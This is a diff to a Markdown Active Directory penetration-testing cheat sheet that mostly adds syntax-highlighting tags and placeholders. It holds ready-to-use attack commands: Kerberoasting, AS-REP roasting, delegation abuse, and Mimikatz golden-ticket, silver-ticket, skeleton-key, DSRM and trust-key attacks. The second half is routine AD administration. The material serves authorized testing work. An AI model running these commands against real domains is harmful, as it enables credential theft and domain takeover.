@@ -29,13 +29,13 @@ Always ensure you have **explicit** permission to access any computer system **b
 * **Get Domain SID:** `Get-DomainSID`
 *   **Get Domain Controllers:**
 
-    ```
+    ```powershell
     Get-ADDomainController
     Get-ADDomainController -Identity $DomainName
     ```
 *   **Enumerate Domain Users:**
 
-    ```
+    ```powershell
     Get-ADUser -Filter * -Identity $user -Properties *
 
     #Get a specific "string" on a user's attribute
@@ -43,19 +43,19 @@ Always ensure you have **explicit** permission to access any computer system **b
     ```
 *   **Enumerate Domain Computers:**
 
-    ```
+    ```powershell
     Get-ADComputer -Filter * -Properties *
     Get-ADGroup -Filter *
     ```
 *   **Enumerate Domain Trust:**
 
-    ```
+    ```powershell
     Get-ADTrust -Filter *
     Get-ADTrust -Identity $DomainName
     ```
 *   **Enumerate Forest Trust:**
 
-    ```
+    ```powershell
     Get-ADForest
     Get-ADForest -Identity $ForestName
 
@@ -75,7 +75,7 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 * **Get Domain SID:** `Get-DomainSID`
 *   **Get Domain Policy:**
 
-    ```
+    ```powershell
     Get-DomainPolicy
 
     #Will show us the policy configurations of the Domain about system access or kerberos
@@ -84,13 +84,13 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
     ```
 *   **Get Domain Controllers:**
 
-    ```
+    ```powershell
     Get-NetDomainController
     Get-NetDomainController -Domain $DomainName
     ```
 *   **Enumerate Domain Users:**
 
-    ```
+    ```powershell
     Get-NetUser
     Get-NetUser -SamAccountName $user
     Get-NetUser | select cn
@@ -113,7 +113,7 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
     ```
 *   **Enumerate Domain Computers:**
 
-    ```
+    ```powershell
     Get-NetComputer -FullData
     Get-DomainGroup
 
@@ -122,7 +122,7 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
     ```
 *   **Enumerate Groups and Group Members:**
 
-    ```
+    ```powershell
     Get-NetGroupMember -GroupName "$GroupName" -Domain $DomainName
 
     #Enumerate the members of a specified group of the domain
@@ -133,7 +133,7 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
     ```
 *   **Enumerate Shares**
 
-    ```
+    ```powershell
     #Enumerate Domain Shares
     Find-DomainShare
 
@@ -142,7 +142,7 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
     ```
 *   **Enumerate Group Policies:**
 
-    ```
+    ```powershell
     Get-NetGPO
 
     # Shows active Policy on specified machine
@@ -154,13 +154,13 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
     ```
 *   **Enumerate OUs:**
 
-    ```
+    ```powershell
     Get-NetOU -FullData 
     Get-NetGPO -GPOname $GPO_GUID
     ```
 *   **Enumerate ACLs:**
 
-    ```
+    ```powershell
     # Returns the ACLs associated with the specified account
     Get-ObjectAcl -SamAccountName $AccountName -ResolveGUIDs
     Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose
@@ -173,13 +173,13 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
     ```
 *   **Enumerate Domain Trust:**
 
-    ```
+    ```powershell
     Get-NetDomainTrust
     Get-NetDomainTrust -Domain $DomainName
     ```
 *   **Enumerate Forest Trust:**
 
-    ```
+    ```powershell
     Get-NetForestDomain
     Get-NetForestDomain Forest $ForestName
 
@@ -193,7 +193,7 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
     ```
 *   **User Hunting:**
 
-    ```
+    ```powershell
     #Finds all machines on the current domain where the current user has local admin access
     Find-LocalAdminAccess -Verbose
 
@@ -219,7 +219,7 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 
 ### Using BloodHound
 
-```
+```powershell
 #Using .exe ingestor
 .\SharpHound.exe --CollectionMethod All --LDAPUser $UserName --LDAPPass $Password --JSONFolder $OutFile_Path
 
@@ -261,20 +261,20 @@ Invoke-BloodHound -CollectionMethod All  -LDAPUser $UserName -LDAPPass $Password
 
 ### PowerShell Remoting
 
-```
+```powershell
 #Enable Powershell Remoting on current Machine (Needs Admin Access)
 Enable-PSRemoting
 
 #Entering or Starting a new PSSession (Needs Admin Access)
 $sess = New-PSSession -ComputerName $ComputerName>
 Enter-PSSession -ComputerName $ComputerName 
--OR-
+#-OR-
 Enter-PSSession -Sessions $SessionName
 ```
 
 ### Remote Code Execution with PS Credentials
 
-```
+```powershell
 $SecPassword = ConvertTo-SecureString '$Password' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('$DomainName\$User', $SecPassword)
 Invoke-Command -ComputerName $ComputerName -Credential $Cred -ScriptBlock {whoami /all}
@@ -282,7 +282,7 @@ Invoke-Command -ComputerName $ComputerName -Credential $Cred -ScriptBlock {whoam
 
 ### Import a PowerShell module and execute its functions remotely
 
-```
+```powershell
 #Execute the command and start a session
 Invoke-Command -Credential $cred -ComputerName $ComputerName -FilePath $PSModule_FilePath -Session $sess 
 
@@ -292,7 +292,7 @@ Enter-PSSession -Session $sess
 
 ### Executing Remote Stateful commands
 
-```
+```powershell
 #Create a new session
 $sess = New-PSSession -ComputerName $ComputerName
 
@@ -410,7 +410,7 @@ _account, extract the encrypted blob that was encrypted using the user's passwor
 
 #### Using PowerView:
 
-```
+```powershell
 #Get User Accounts that are used as Service Accounts
 Get-NetUser -SPN
 
@@ -426,14 +426,14 @@ Invoke-Mimikatz -Command '"kerberos::list /export"'
 
 #### Using PowerShell AD Module:
 
-```
+```powershell
 #Get User Accounts that are used as Service Accounts
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
 ```
 
 #### Using Impacket:
 
-```
+```python
 python GetUserSPNs.py $DomainName/$DomainUser:$Password -outputfile $Out_File
 ```
 
@@ -472,17 +472,19 @@ We add a filter (e.g. RDPUsers) to get "User Accounts" not Machine Accounts, bec
 
 #### Using PowerView:
 
-```
+```powershell
 Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
-Disable Kerberos Preauth:
+
+#Disable Kerberos Preauth:
 Set-DomainObject -Identity $UserAccount -XOR @{useraccountcontrol=4194304} -Verbose
-Check if the value changed:
+
+#Check if the value changed:
 Get-DomainUser -PreauthNotRequired -Verbose
 ```
 
 And finally execute the attack using the [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast) tool.
 
-```
+```powershell
 #Get a specific Account's hash:
 Get-ASREPHash -UserName $UserName -Verbose
 
@@ -507,7 +509,7 @@ Rubeus.exe asreproast /ou:$OU_Name /format:$Format /domain:$DomainName /outfile:
 
 #### Using Impacket:
 
-```
+```python
 #Trying the attack for the specified users on the file
 python GetNPUsers.py $DomainName/ -usersfile $Users_File -outputfile $Out_File
 ```
@@ -529,7 +531,7 @@ _If we have enough permissions -> GenericAll/GenericWrite we can set a SPN on a 
 
 #### Using PowerView:
 
-```
+```powershell
 #Check for interesting permissions on accounts:
 Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
 
@@ -542,7 +544,7 @@ Set-DomainObject $UserName -Set @{serviceprincipalname='ops/whatever1'}
 
 #### Using PowerShell AD Module:
 
-```
+```powershell
 #Check if current user has already an SPN setted
 Get-ADUser -Identity $UserName -Properties ServicePrincipalName | select ServicePrincipalName
 
@@ -604,7 +606,7 @@ _If we have Administrative access on a machine that has Unconstrained Delegation
 
 Using PowerView:
 
-```
+```powershell
 #Discover domain joined computers that have Unconstrained Delegation enabled
 Get-NetComputer -UnConstrained
 
@@ -627,11 +629,13 @@ Invoke-Mimikatz -Command '"kerberos::ptt $Ticket_Path"'
 
 Using PowerView and Kekeo:
 
-```
+```powershell
 #Enumerate Users and Computers with constrained delegation
 Get-DomainUser -TrustedToAuth
 Get-DomainComputer -TrustedToAuth
-
+```
+After enumeration, request the TGT using kekeo
+```
 #If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo
 tgt::ask /user:$UserName /domain:$Domain_FQDN /rc4:$Password_Hash
 
@@ -668,7 +672,7 @@ First we need to enter the security context of the user/machine account that has
 
 Exploitation Example:
 
-```
+```powershell
 #Import Powermad and use it to create a new MACHINE ACCOUNT
 . .\Powermad.ps1
 New-MachineAccount -MachineAccount $MachineAccountName -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose
@@ -684,8 +688,10 @@ $SD.GetBinaryForm($SDBytes, 0)
 
 #Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView
 Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
+```
 
-#After that we need to get the RC4 hash of the new machine account's password using Rubeus
+After that we need to get the RC4 hash of the new machine account's password using Rubeus
+```
 Rubeus.exe hash /password:'p@ssword!'
 
 #TODO: Fix these last two examples (Domain and computername needed?)
@@ -762,7 +768,7 @@ diskshadow /s script.txt
 
 1. Next we need to access the shadow copy, we may have the SeBackupPrivilege but we cant just simply copy-paste ntds.dit, we need to mimic a backup software and use Win32 API calls to copy it on an accessible folder. For this we are going to use [this](https://github.com/giuliano108/SeBackupPrivilege) amazing repo:
 
-```
+```powershell
 #Importing both dlls from the repo using powershell
 Import-Module .\SeBackupPrivilegeCmdLets.dll
 Import-Module .\SeBackupPrivilegeUtils.dll
@@ -857,13 +863,12 @@ Detailed Articles:
 
 ### Golden Ticket Attack
 
-```
+```powershell
 #Execute mimikatz on DC as DA to grab krbtgt hash:
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DC'sName>
 
 #On any machine:
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DomainName> /sid:<Domain's SID> /krbtgt:
-<HashOfkrbtgtAccount>   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DomainName> /sid:<Domain's SID> /krbtgt:<HashOfkrbtgtAccount> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ```
 
 ### DCsync Attack
@@ -885,35 +890,34 @@ secretsdump.py -no-pass -k <Domain>/<Username>@<DC'S IP or FQDN> -just-dc-ntlm
 
 ### Silver Ticket Attack
 
-```
-Invoke-Mimikatz -Command '"kerberos::golden /domain:<DomainName> /sid:<DomainSID> /target:<TheTargetMachine> /service:
-<ServiceType> /rc4:<TheSPN's Account NTLM Hash> /user:<UserToImpersonate> /ptt"'
+```powershell
+Invoke-Mimikatz -Command '"kerberos::golden /domain:<DomainName> /sid:<DomainSID> /target:<TheTargetMachine> /service:<ServiceType> /rc4:<TheSPN's Account NTLM Hash> /user:<UserToImpersonate> /ptt"'
 ```
 
 [SPN List](https://adsecurity.org/?page\_id=183)
 
 ### Skeleton Key Attack
 
-```
+```powershell
 #Exploitation Command runned as DA:
-Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DC's FQDN>
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName $DC_hostname
 
 #Access using the password "mimikatz"
-Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
+Enter-PSSession -ComputerName $ComputerName -Credential $Domain\$UserName
 ```
 
 ### DSRM Abuse
 
 _Every DC has a local Administrator account, this accounts has the DSRM password which is a SafeBackupPassword. We can get this and then pth its NTLM hash to get local Administrator access to DC!_
 
-```
+```powershell
 #Dump DSRM password (needs DA privs):
-Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <DC's Name>
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName $DC_hostname
 
 #This is a local account, so we can PTH and authenticate!
 #BUT we need to alter the behaviour of the DSRM account before pth:
 #Connect on DC:
-Enter-PSSession -ComputerName <DC's Name>
+Enter-PSSession -ComputerName $DC_hostname
 
 #Alter the Logon behaviour on registry:
 New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose
@@ -930,7 +934,7 @@ _We can set our on SSP by dropping a custom dll, for example mimilib.dll from mi
 
 From powershell:
 
-```
+```powershell
 #Get current Security Package:
 $packages = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' | select -ExpandProperty  'Security Packages'
 
@@ -957,15 +961,13 @@ _If we have Domain Admin rights on a Domain that has Bidirectional Trust relatio
 
 #### Using Mimikatz:
 
-```
+```powershell
 #Dump the trust key
 Invoke-Mimikatz -Command '"lsadump::trust /patch"'
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 
 #Forge an inter-realm TGT using the Golden Ticket attack
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<OurDomain> /sid:  
-<OurDomainSID> /rc4:<TrustKey> /service:krbtgt /target:<TheTargetDomain> /ticket:
-<PathToSaveTheGoldenTicket>"'
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<OurDomain> /sid:<OurDomainSID> /rc4:<TrustKey> /service:krbtgt /target:<TheTargetDomain> /ticket:<PathToSaveTheGoldenTicket>"'
 ```
 
 ❗ Tickets -> .kirbi format
@@ -983,7 +985,7 @@ Then Ask for a TGS to the external Forest for any service using the inter-realm 
 * Enumerate MSSQL Instances: `Get-SQLInstanceDomain`
 * Check Accessibility as current user:
 
-```
+```powershell
 Get-SQLConnectionTestThreaded
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
 ```
@@ -996,7 +998,7 @@ Check for existing Database Links:
 ```
 #Check for existing Database Links:
 #PowerUpSQL:
-Get-SQLServerLink -Instace <SPN> -Verbose
+Get-SQLServerLink -Instance <SPN> -Verbose
 
 #MSSQL Query:
 select * from master..sysservers
@@ -1077,7 +1079,7 @@ nltest /DSGETDC:DomainName
 
 #### Using PowerShell
 
-```
+```powershell
 ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
 
 ([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()
@@ -1144,13 +1146,13 @@ set u
 
 ### List all Usernames
 
-```
+```powershell
 ([adsisearcher]"(&(objectClass=User)(samaccountname=*))").FindAll().Properties.samaccountname
 ```
 
 ### List Administrators
 
-```
+```powershell
 ([adsisearcher]"(&(objectClass=User)(admincount=1))").FindAll().Properties.samaccountname
 ```
 
@@ -1158,7 +1160,7 @@ set u
 
 #### Using PowerShell
 
-```
+```powershell
 ([adsisearcher]"(&(objectClass=User)(samaccountname=<username>))").FindAll().Properties
 ```
 
@@ -1170,7 +1172,7 @@ nltest /user:"zweilos"
 
 ### View All Users with Description Field Set
 
-```
+```powershell
 ([adsisearcher]"(&(objectClass=group)(samaccountname=*))").FindAll().Properties | % { Write-Host $_.samaccountname : $_.description }
 ```
 
@@ -1178,25 +1180,25 @@ nltest /user:"zweilos"
 
 #### View all Active Directory commands
 
-```
-get-command -Module ActiveDirectory
+```powershell
+Get-Command -Module ActiveDirectory
 ```
 
 #### Display Basic Domain Information
 
-```
+```powershell
 Get-ADDomain
 ```
 
 #### Get all Domain Controllers by Hostname and Operating
 
-```
+```powershell
 Get-ADDomainController -filter * | select hostname, operatingsystem
 ```
 
 #### Get all Fine Grained Password Policies
 
-```
+```powershell
 Get-ADFineGrainedPasswordPolicy -filter *
 ```
 
@@ -1204,7 +1206,7 @@ Get-ADFineGrainedPasswordPolicy -filter *
 
 Gets the password policy from the logged in domain
 
-```
+```powershell
 Get-ADDefaultDomainPasswordPolicy
 ```
 
@@ -1212,8 +1214,8 @@ Get-ADDefaultDomainPasswordPolicy
 
 This will back up the domain controllers system state data. Change DC-Name to your server name and change the Backup-Path. The backup path can be a local disk or a UNC path
 
-```
-invoke-command -ComputerName DC-Name -scriptblock {wbadmin start systemstateback up -backupTarget:"Backup-Path" -quiet}
+```powershell
+Invoke-Command -ComputerName $DC_Name -scriptblock {wbadmin start systemstateback up -backupTarget:"Backup-Path" -quiet}
 ```
 
 ## AD User PowerShell Commands
@@ -1224,21 +1226,21 @@ This section is all Active Directory user commands
 
 Change username to the samAccountName of the account
 
-```
-Get-ADUser username -Properties *
+```powershell
+Get-ADUser $username -Properties *
 ```
 
 **Get User and List Specific Properties**
 
 Just add whatever you want to display after select
 
-```
-Get-ADUser username -Properties * | Select name, department, title
+```powershell
+Get-ADUser $username -Properties * | Select name, department, title
 ```
 
 #### Get All Active Directory Users in Domain
 
-```
+```powershell
 Get-ADUser -Filter *
 ```
 
@@ -1246,126 +1248,133 @@ Get-ADUser -Filter *
 
 OU = the distinguished path of the OU
 
-```
+```powershell
 Get-ADUser -SearchBase “OU=ADPRO Users,dc=ad,dc=activedirectorypro.com” -Filter *
 ```
 
 #### Get AD Users by Name
 
-This command will find all users that have the word robert in the name. Just change robert to the word you want to search for.
+This command will find all users that have the word bob in the name. 
 
-```
-get-Aduser -Filter {name -like "*robert*"}
+```powershell
+Get-Aduser -Filter {name -like "*bob*"}
 ```
 
 #### Get All Disable User Accounts
 
-```
+```powershell
 Search-ADAccount -AccountDisabled | select name
 ```
 
 #### Disable User Account
 
-```
-Disable-ADAccount -Identity rallen
+```powershell
+Disable-ADAccount -Identity $UserName
 ```
 
 #### Enable User Account
 
-```
-Enable-ADAccount -Identity rallen
+```powershell
+Enable-ADAccount -Identity $UserName
 ```
 
 #### Get All Accounts with Password Set to Never Expire
 
-```
-get-aduser -filter * -properties Name, PasswordNeverExpires | where {$_.passwordNeverExpires -eq "true" } | Select-Object DistinguishedName,Name,Enabled
+```powershell
+Get-Aduser -filter * -properties Name, PasswordNeverExpires | where {$_.passwordNeverExpires -eq "true" } | Select-Object DistinguishedName,Name,Enabled
 ```
 
 #### Find All Locked User Accounts
 
-```
+```powershell
 Search-ADAccount -LockedOut
 ```
 
 #### Unlock User Account
 
-```
-Unlock-ADAccount –Identity john.smith
+```powershell
+Unlock-ADAccount –Identity $UserName
 ```
 
 #### List all Disabled User Accounts
 
-```
+```powershell
 Search-ADAccount -AccountDisabled
 ```
 
 #### Force Password Change at Next Login
 
-```
-Set-ADUser -Identity username -ChangePasswordAtLogon $true
+```powershell
+Set-ADUser -Identity $UserName -ChangePasswordAtLogon $true
 ```
 
 #### Move a Single User to a New OU
 
 You will need the distinguishedName of the user and the target OU
 
-```
-Move-ADObject -Identity "CN=Test User (0001),OU=ADPRO Users,DC=ad,DC=activedirectorypro,DC=com" -TargetPath "OU=HR,OU=ADPRO Users,DC=ad,DC=activedirectorypro,DC=com"
+```powershell
+Move-ADObject -Identity "CN=bob,OU=Users,DC=ad,DC=ad,DC=com" -TargetPath "OU=HR,OU=Users,DC=ad,DC=ad,DC=com"
 ```
 
 #### Move Users to an OU from a CSV
 
 Setup a csv with a name field and a list of the users sAmAccountNames. Then just change the target OU path.
 
-```
-# Specify target OU. $TargetOU = "OU=HR,OU=ADPRO Users,DC=ad,DC=activedirectorypro,DC=com" # Read user sAMAccountNames from csv file (field labeled "Name"). Import-Csv -Path Users.csv | ForEach-Object { # Retrieve DN of User. $UserDN = (Get-ADUser -Identity $_.Name).distinguishedName # Move user to target OU. Move-ADObject -Identity $UserDN -TargetPath $TargetOU }
+```powershell
+# Specify target OU. 
+$TargetOU = "OU=HR,OU=Users,DC=ad,DC=ad,DC=com"
+
+# Read user SAMAccountNames from csv file (field labeled "Name"). 
+Import-Csv -Path $csvFile | ForEach-Object { 
+
+  # Retrieve DN of User. 
+  $UserDN = (Get-ADUser -Identity $_.Name).distinguishedName 
+
+  # Move user to target OU. 
+  Move-ADObject -Identity $UserDN -TargetPath $TargetOU 
+}
 ```
 
 ## AD Group Commands
 
 #### Get All members Of A Security group
 
-```
-Get-ADGroupMember -identity “HR Full”
+```powershell
+Get-ADGroupMember -identity $GroupName
 ```
 
 #### Get All Security Groups
 
 This will list all security groups in a domain
 
-```
+```powershell
 Get-ADGroup -filter *
 ```
 
 #### Add User to Group
 
-Change group-name to the AD group you want to add users to
-
-```
-Add-ADGroupMember -Identity group-name -Members Sser1, user2
+```powershell
+Add-ADGroupMember -Identity $GroupName -Members $user1, $user2
 ```
 
 #### Export Users From a Group
 
 This will export group members to a CSV, change group-name to the group you want to export.
 
-```
-Get-ADGroupMember -identity “Group-name” | select name | Export-csv -path C:OutputGroupmembers.csv -NoTypeInformation
+```powershell
+Get-ADGroupMember -identity $GroupName | select name | Export-csv -Path $OutCsv -NoTypeInformation
 ```
 
 #### Get Group by keyword
 
-Find a group by keyword. Helpful if you are not sure of the name, change group-name.
-
-```
-get-adgroup -filter * | Where-Object {$_.name -like "*group-name*"}
+```powershell
+Get-AdGroup -filter * | Where-Object {$_.name -like "*$GroupName*"}
 ```
 
 #### Import a List of Users to a Group
 
-```
-$members = Import-CSV c:itadd-to-group.csv | Select-Object -ExpandProperty samaccountname Add-ADGroupMember -Identity hr-n-drive-rw -Members $members
+```powershell
+$members = Import-CSV $csvFile | Select-Object -ExpandProperty samaccountname | Add-ADGroupMember -Identity $GroupName -Members $members
 ```
 
 ## AD Computer Commands
@@ -1374,7 +1383,7 @@ $members = Import-CSV c:itadd-to-group.csv | Select-Object -ExpandProperty samac
 
 This will list all computers in the domain
 
-```
+```powershell
 Get-AdComputer -filter *
 ```
 
@@ -1382,27 +1391,25 @@ Get-AdComputer -filter *
 
 This will list all the computers in the domain and only display the hostname
 
-```
+```powershell
 Get-ADComputer -filter * | select name
 ```
 
 #### Get All Computers from an OU
 
-```
-Get-ADComputer -SearchBase "OU=DN" -Filter *
+```powershell
+Get-ADComputer -SearchBase "OU=$DistinguishedName" -Filter *
 ```
 
 #### Get a Count of All Computers in Domain
 
-```
+```powershell
 Get-ADComputer -filter * | measure
 ```
 
 #### Get all Windows 10 Computers
 
-Change Windows 10 to any OS you want to search for
-
-```
+```powershell
 Get-ADComputer -filter {OperatingSystem -Like '*Windows 10*'} -property * | select name, operatingsystem
 ```
 
@@ -1410,47 +1417,47 @@ Get-ADComputer -filter {OperatingSystem -Like '*Windows 10*'} -property * | sele
 
 This will provide a count of all computers and group them by the operating system. A great command to give you a quick inventory of computers in AD.
 
-```
+```powershell
 Get-ADComputer -Filter "name -like '*'" -Properties operatingSystem | group -Property operatingSystem | Select Name,Count
 ```
 
 #### Delete a single Computer
 
-```
-Remove-ADComputer -Identity "USER04-SRV4"
+```powershell
+Remove-ADComputer -Identity "$ComputerName"
 ```
 
 #### Delete a List of Computer Accounts
 
 Add the hostnames to a text file and run the command below.
 
-```
-Get-Content -Path C:ComputerList.txt | Remove-ADComputer
+```powershell
+Get-Content -Path $ComputerList | Remove-ADComputer
 ```
 
 #### Delete Computers From an OU
 
-```
-Get-ADComputer -SearchBase "OU=DN" -Filter * | Remote-ADComputer
+```powershell
+Get-ADComputer -SearchBase "OU=$DistinguishedName" -Filter * | Remote-ADComputer
 ```
 
 ## Group Policy
 
 #### Get all GPO related commands
 
-```
-get-command -Module grouppolicy
+```powershell
+Get-Command -Module grouppolicy
 ```
 
 #### Get all GPOs by status
 
-```
-get-GPO -all | select DisplayName, gpostatus
+```powershell
+Get-GPO -all | select DisplayName, gpostatus
 ```
 
 #### Backup all GPOs in the Domain
 
-```
+```powershell
 Backup-Gpo -All -Path E:GPObackup
 ```
 
